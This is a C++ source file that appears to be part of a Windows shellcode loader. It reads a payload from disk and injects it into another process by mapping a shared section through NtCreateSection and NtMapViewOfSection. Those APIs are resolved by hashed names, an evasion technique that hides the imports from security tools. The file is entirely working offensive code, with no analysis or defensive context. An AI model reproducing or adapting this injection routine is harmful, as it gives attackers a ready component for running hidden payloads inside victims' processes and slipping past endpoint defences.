#include "Injection.h"
#include "CRT.h"
#include "HashString.h"
#include "ApiResolve.h"

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

typedef enum _SECTION_INHERIT
{
	ViewShare = 1, // The mapped view of the section will be mapped into any child processes created by the process.
	ViewUnmap = 2  // The mapped view of the section will not be mapped into any child processes created by the process.
} SECTION_INHERIT;

bool GetFileDataW(_In_ const std::wstring wsFilepath, _Out_ LPVOID* lpBuffer, _Out_ DWORD* dwFileSize) {
	HANDLE hFile = CreateFileW(wsFilepath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return false;
	}

	*dwFileSize = GetFileSize(hFile, NULL);
	if (*dwFileSize == INVALID_FILE_SIZE) {
		CloseHandle(hFile);
		return false;
	}

	*lpBuffer = VirtualAlloc(NULL, *dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (*lpBuffer == nullptr) {
		CloseHandle(hFile);
		return false;
	}

	DWORD dwBytesRead;
	BOOL bResult = ReadFile(hFile, *lpBuffer, *dwFileSize, &dwBytesRead, NULL);
	CloseHandle(hFile);
	if (!bResult || dwBytesRead != *dwFileSize) {
		VirtualFree(*lpBuffer, 0, MEM_RELEASE);
		return false;
	}

	return true;
}

bool MappingShellcode(_In_ HANDLE hTargetProcess, _In_ LPVOID lpShellcode, _In_ DWORD dwShellSize, _Out_ LPVOID* lpRemoteAddr, _In_ ULONG PageProtection) {
	ApiResolve apiResolve;
	constexpr unsigned int hashNtdll = ComplexHashForWChar(L"ntdll.dll");
	LPVOID lpNtdll = apiResolve.GetModuleBaseAddress(hashNtdll);
	if (!lpNtdll) {
		return false;
	}

	typedef NTSTATUS(NTAPI* _NtCreateSection) (
		PHANDLE            SectionHandle,
		ACCESS_MASK        DesiredAccess,
		LPVOID ObjectAttributes,
		PLARGE_INTEGER     MaximumSize,
		ULONG              SectionPageProtection,
		ULONG              AllocationAttributes,
		HANDLE             FileHandle
		);

	constexpr unsigned int hashNtCreateSection = ComplexHashForAnsi("NtCreateSection");
	_NtCreateSection pNtCreateSection = (_NtCreateSection)apiResolve.GetApiAddress(lpNtdll, hashNtCreateSection);
	if (!pNtCreateSection) {
		return false;
	}

	NTSTATUS ntStatus;
	HANDLE hSection = nullptr;
	LARGE_INTEGER size;
	size.QuadPart = dwShellSize;
	ntStatus = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, nullptr);
	if (!NT_SUCCESS(ntStatus) || hSection == nullptr) { return false; }

	constexpr unsigned int hashNtMapViewOfSection = ComplexHashForAnsi("NtMapViewOfSection");
	typedef NTSTATUS
	(NTAPI*
		_NtMapViewOfSection)(
			_In_ HANDLE SectionHandle,
			_In_ HANDLE ProcessHandle,
			_Inout_ _At_(*BaseAddress, _Readable_bytes_(*ViewSize) _Writable_bytes_(*ViewSize) _Post_readable_byte_size_(*ViewSize)) PVOID* BaseAddress,
			_In_ ULONG_PTR ZeroBits,
			_In_ SIZE_T CommitSize,
			_Inout_opt_ PLARGE_INTEGER SectionOffset,
			_Inout_ PSIZE_T ViewSize,
			_In_ SECTION_INHERIT InheritDisposition,
			_In_ ULONG AllocationType,
			_In_ ULONG PageProtection
			);

	_NtMapViewOfSection pNtMapViewOfSection = (_NtMapViewOfSection)apiResolve.GetApiAddress(lpNtdll, hashNtMapViewOfSection);
	if (!pNtMapViewOfSection) {
		return false;
	}

	PVOID pLocalAddr = nullptr;
	SIZE_T viewSize = dwShellSize;
	ntStatus = pNtMapViewOfSection(
		hSection,
		GetCurrentProcess(),
		&pLocalAddr,
		0,
		0,
		nullptr,
		&viewSize,
		ViewUnmap,
		0,
		PAGE_READWRITE
	);
	if (!NT_SUCCESS(ntStatus)) {
		CloseHandle(hSection);
		return false;
	}

	memcpy(pLocalAddr, lpShellcode, dwShellSize);

	viewSize = dwShellSize;
	ntStatus = pNtMapViewOfSection(
		hSection,
		hTargetProcess,
		lpRemoteAddr,
		0,
		0,
		nullptr,
		&viewSize,
		ViewUnmap,
		0,
		PageProtection
	);
	if (!NT_SUCCESS(ntStatus)) {
		CloseHandle(hSection);
		return false;
	}

	return true;
}